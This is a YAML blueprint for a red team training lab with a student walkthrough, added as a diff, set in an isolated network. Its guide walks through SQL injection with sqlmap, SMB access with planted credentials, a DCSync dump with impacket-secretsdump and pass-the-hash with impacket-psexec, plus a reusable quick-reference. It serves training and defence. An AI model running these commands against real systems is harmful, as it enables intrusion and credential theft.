@@ -1,0 +1,316 @@
+# CYROID Red Team Training Lab Blueprint
+seed_id: red-team-training-lab
+name: Red Team Training Lab
+description: |
+  Comprehensive red team training environment featuring:
+  - Kali Attack Box with pre-installed tools (Metasploit, Impacket, CrackMapExec, etc.)
+  - WordPress target with SQL injection vulnerabilities
+  - Samba Domain Controller
+  - Internal file server with sensitive data
+  - Victim workstation for BeEF exploitation
+  - C2 redirectors for infrastructure training
+
+  Attack paths: SQLi -> Credential theft -> Lateral movement -> Domain compromise
+
+base_subnet_prefix: "172.16"
+
+networks:
+  - name: internet
+    subnet: "172.16.0.0/24"
+    gateway: "172.16.0.1"
+    is_isolated: false
+
+  - name: dmz
+    subnet: "172.16.1.0/24"
+    gateway: "172.16.1.1"
+    is_isolated: true
+
+  - name: internal
+    subnet: "172.16.2.0/24"
+    gateway: "172.16.2.1"
+    is_isolated: true
+
+vms:
+  # Attack box
+  - hostname: kali
+    template_name: "Red Team - Kali Attack Box"
+    network_name: internet
+    ip_address: "172.16.0.10"
+    cpu: 4
+    ram_mb: 4096
+    disk_gb: 60
+    position_x: 100
+    position_y: 200
+
+  # C2 Redirectors
+  - hostname: redir1
+    template_name: "Red Team - Redirector"
+    network_name: internet
+    ip_address: "172.16.0.20"
+    cpu: 1
+    ram_mb: 512
+    disk_gb: 10
+    position_x: 100
+    position_y: 100
+
+  - hostname: redir2
+    template_name: "Red Team - Redirector"
+    network_name: internet
+    ip_address: "172.16.0.21"
+    cpu: 1
+    ram_mb: 512
+    disk_gb: 10
+    position_x: 100
+    position_y: 300
+
+  # DMZ - Web server (primary in DMZ, also on internet for attacker access)
+  - hostname: webserver
+    template_name: "Red Team - WordPress Target"
+    network_name: dmz
+    ip_address: "172.16.1.10"
+    cpu: 2
+    ram_mb: 2048
+    disk_gb: 20
+    position_x: 400
+    position_y: 200
+
+  # Internal network - Domain Controller
+  - hostname: dc01
+    template_name: "Samba DC"
+    network_name: internal
+    ip_address: "172.16.2.10"
+    cpu: 2
+    ram_mb: 2048
+    disk_gb: 20
+    position_x: 700
+    position_y: 100
+
+  # Internal network - File Server
+  - hostname: fileserver
+    template_name: "Red Team - File Server"
+    network_name: internal
+    ip_address: "172.16.2.20"
+    cpu: 1
+    ram_mb: 1024
+    disk_gb: 10
+    position_x: 700
+    position_y: 200
+
+  # Internal network - Victim Workstation
+  - hostname: ws01
+    template_name: "Red Team - Victim Workstation"
+    network_name: internal
+    ip_address: "172.16.2.30"
+    cpu: 1
+    ram_mb: 1024
+    disk_gb: 10
+    position_x: 700
+    position_y: 300
+
+router:
+  enabled: true
+  dhcp_enabled: false
+
+# Walkthrough/Student Guide
+walkthrough:
+  title: "Red Team Training Lab - Student Guide"
+  overview: |
+    Welcome to the Red Team Training Lab. You will play the role of a penetration tester
+    who has been hired to assess Acme Widgets' security posture. Your goal is to gain
+    Domain Admin access starting from a position outside the network.
+  objectives:
+    - Network reconnaissance and enumeration
+    - SQL injection attacks and credential extraction
+    - Cross-site scripting (XSS) and browser exploitation with BeEF
+    - Lateral movement using stolen credentials
+    - Active Directory attacks (DCSync)
+    - The importance of defense-in-depth
+  network_diagram: |
+    INTERNET (172.16.0.0/24)
+    +---------------------------+
+    |  kali (172.16.0.10)       |  <-- Your Attack Box
+    |  redir1 (172.16.0.20)     |
+    |  redir2 (172.16.0.21)     |
+    +---------------------------+
+                |
+    ============|============  (Router)
+                |
+    DMZ (172.16.1.0/24)
+    +-----------------------+
+    | webserver (172.16.1.10)|  <-- WordPress Target
+    +-----------------------+
+                |
+    ============|============  (Router)
+                |
+    INTERNAL (172.16.2.0/24)
+    +-----------------------+
+    | dc01 (172.16.2.10)     |  <-- Domain Controller
+    | fileserver (.2.20)     |  <-- SMB File Server
+    | ws01 (172.16.2.30)     |  <-- Employee Workstation
+    +-----------------------+
+  phases:
+    - id: recon
+      title: "Phase 1: Reconnaissance"
+      description: "Discover and enumerate the target network"
+      steps:
+        - id: recon-1
+          title: "Check your position"
+          content: |
+            First, understand your position in the network. Open a terminal on Kali.
+            ```bash
+            ip addr show eth0
+            ```
+            You should see 172.16.0.10 - you're on the "internet" network.
+        - id: recon-2
+          title: "Network Discovery"
+          content: |
+            Scan your network to find live hosts:
+            ```bash
+            nmap -sn 172.16.0.0/24
+            ```
+            You should find the webserver at 172.16.0.100.
+        - id: recon-3
+          title: "Service Enumeration"
+          content: |
+            Scan services on the webserver:
+            ```bash
+            nmap -sV -sC 172.16.0.100
+            ```
+            Expected: Port 80 (HTTP), Port 3306 (MySQL)
+    - id: sqli
+      title: "Phase 2: SQL Injection"
+      description: "Exploit the web application to extract credentials"
+      steps:
+        - id: sqli-1
+          title: "Web Enumeration"
+          content: |
+            Explore the web application:
+            ```bash
+            gobuster dir -u http://172.16.0.100 -w /usr/share/wordlists/dirb/common.txt
+            ```
+            Look for /employee-directory/
+        - id: sqli-2
+          title: "Test for SQLi"
+          content: |
+            Test the search box for SQL injection:
+            ```bash
+            curl "http://172.16.0.100/employee-directory/?search='"
+            ```
+            An error indicates vulnerability.
+        - id: sqli-3
+          title: "Extract Credentials"
+          content: |
+            Use sqlmap to dump the database:
+            ```bash
+            sqlmap -u "http://172.16.0.100/employee-directory/?search=test" -D wordpress -T wp_acme_employees --dump --batch
+            ```
+            You'll find: svc_backup / Backup2024!
+    - id: lateral
+      title: "Phase 3: Lateral Movement"
+      description: "Use stolen credentials to access internal systems"
+      steps:
+        - id: lateral-1
+          title: "Test SMB Access"
+          content: |
+            Test credentials on the file server:
+            ```bash
+            smbclient -L //172.16.2.20 -U svc_backup%Backup2024!
+            ```
+        - id: lateral-2
+          title: "Access Sensitive Files"
+          content: |
+            Connect to the sensitive share:
+            ```bash
+            smbclient //172.16.2.20/sensitive -U svc_backup%Backup2024!
+            ```
+            Download and examine passwords.txt
+    - id: ad-attack
+      title: "Phase 4: Active Directory Attack"
+      description: "Compromise the domain using DCSync"
+      steps:
+        - id: ad-1
+          title: "DCSync Attack"
+          content: |
+            The svc_backup account has DCSync rights (misconfiguration):
+            ```bash
+            impacket-secretsdump 'acmewidgets.local/svc_backup:Backup2024!@172.16.2.10'
+            ```
+            This extracts all domain password hashes.
+        - id: ad-2
+          title: "Pass-the-Hash"
+          content: |
+            Use the Administrator hash to get a shell:
+            ```bash
+            impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH> Administrator@172.16.2.10
+            ```
+            You now have Domain Admin access!
+    - id: post-exploit
+      title: "Phase 5: Post-Exploitation"
+      description: "Verify access and explore the domain"
+      steps:
+        - id: post-1
+          title: "Verify Access"
+          content: |
+            On the DC:
+            ```bash
+            whoami
+            whoami /groups
+            net group "Domain Admins" /domain
+            ```
+  defensive_lessons:
+    - vulnerability: "SQL Injection"
+      impact: "Credential theft"
+      mitigation: "Parameterized queries, input validation, WAF"
+    - vulnerability: "Plaintext passwords"
+      impact: "Direct credential exposure"
+      mitigation: "Hash passwords, use secrets manager"
+    - vulnerability: "Password reuse"
+      impact: "Lateral movement"
+      mitigation: "Unique passwords, password manager"
+    - vulnerability: "DCSync rights for service account"
+      impact: "Domain compromise"
+      mitigation: "Principle of least privilege"
+  quick_reference: |
+    # Network scanning
+    nmap -sn 172.16.1.0/24                    # Host discovery
+    nmap -sV -sC -p- <IP>                     # Full port scan
+
+    # SQL Injection
+    sqlmap -u "<URL>" --dbs                   # List databases
+    sqlmap -u "<URL>" -D <db> --tables        # List tables
+    sqlmap -u "<URL>" -D <db> -T <tbl> --dump # Dump table
+
+    # SMB
+    smbclient -L //<IP> -U <user>%<pass>      # List shares
+    smbclient //<IP>/<share> -U <user>%<pass> # Connect to share
+
+    # Active Directory
+    impacket-secretsdump '<domain>/<user>:<pass>@<DC>'    # DCSync
+    impacket-psexec -hashes <LM>:<NTLM> <user>@<IP>       # Pass-the-Hash
+
+# Training scenario events (MSEL)
+events:
+  - sequence: 1
+    delay_minutes: 0
+    title: "Phase 1: Reconnaissance"
+    description: "Use Kali tools to scan and enumerate the DMZ webserver"
+
+  - sequence: 2
+    delay_minutes: 15
+    title: "Phase 2: Initial Access"
+    description: "Exploit SQL injection in WordPress to extract credentials"
+
+  - sequence: 3
+    delay_minutes: 30
+    title: "Phase 3: Credential Harvesting"
+    description: "Use extracted credentials to access internal network"
+
+  - sequence: 4
+    delay_minutes: 45
+    title: "Phase 4: Lateral Movement"
+    description: "Move from webserver to internal hosts using Impacket"
+
+  - sequence: 5
+    delay_minutes: 60
+    title: "Phase 5: Domain Compromise"
+    description: "Extract domain admin credentials and compromise DC"
